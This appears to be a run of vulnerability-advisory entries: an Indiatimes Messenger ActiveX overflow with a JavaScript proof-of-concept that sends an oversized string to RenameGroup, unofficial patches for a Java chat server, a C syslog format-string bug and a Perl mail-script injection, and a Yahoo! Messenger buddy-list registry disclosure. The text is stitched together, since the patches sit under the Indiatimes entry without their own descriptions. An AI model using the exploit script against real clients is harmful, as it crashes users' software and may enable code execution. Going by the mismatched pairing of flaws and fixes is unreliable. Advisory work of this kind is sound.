Description:
ViPeR reported a vulnerability in Indiatimes Messenger.  A remote user can cause denial of service conditions.
A remote user can create specially crafted scripting code that, when loaded by the target user, will cause the target user's Indiatimes Messenger client to crash.

A remote user can overwrite the ECX and EDI registers.  Arbitrary code execution may be possible, but was not confirmed in the report.

Some demonstration exploit code is provided:

[script]
var obj1 = new
ActiveXObject("MMClient.MunduMessenger.1");
var buf = "";

for(i=0; i<1000; i++)
{
  buf += "A";
}

while(obj1.GetServerStatus() != "Logged In"); //wait till login

obj1.RenameGroup("Friends", buf, 5);
[/script]

Gregory R. Panakkal discovered this vulnerability.

Solution:
No solution was available at the time of this entry.

The author of the report has provided an unofficial patch for the 'UserManager.java' vulnerability.  Replace the method addUser( Socket sock ) in UserManager.java, with the following patched method:

       public void addUser( Socket sock )
       {
             User usr = new User(sock, this);
             String usrName = usr.getName();
             if (usrName != "" )
             {

                   /* start fix */
                   /* manage NullPointerException */
                   try{

                         if (userHash.containsKey( usrName) )
                         {
                               usr.rejectUsername();
                               return;
                         }

                   }catch(NullPointerException npe){
                         usr.rejectUsername();
                         return;
                   }
                  /* end fix */

                   usr.sendRoomList(rmManager.getRoomList());
                   userHash.put( usr.getName(), usr );
                   rmManager.getDefaultRoom().addUser( usr );


                   //start the reciever thread
                   Thread t = new Thread(usr);
                   t.start();
            }

       }

No solution was available at the time of this entry.

The author of the report has indicated that, as a workaround, you can edit the 'src/s_debug.c' file:

from:
    syslog(LOG_ERR, debugbuf);

to:
    syslog(LOG_ERR, "%s", debugbuf).

No solution was available at the time of this entry.  The vendor reportedly plans to issue a fix.

The author of the report has provided the following unofficial patch:

 Replace the following line:

 my $word=$';

 With:

 my $word=$';
 $word =~ s/[^\w]//g;

 And replace the following line:

 open (MAIL,"| $sendmail $recipient") || die $!;

 With:

 open (MAIL,"| $sendmail -t") || die $!;

Description:
Hirosh reported an information disclosure vulnerability in Yahoo! Messenger.  A local user may be able to obtain the buddy list of another user on that system.
It is reported that Yahoo! Messenger stores some of the buddy list names in the following Windows registry location:

HKEY_CURRENT_USER\Software\Yahoo\Pager\profiles\<username>\IMVironments\Recent

Apparently, this location does not store the full buddy list, but does store recently active buddies.

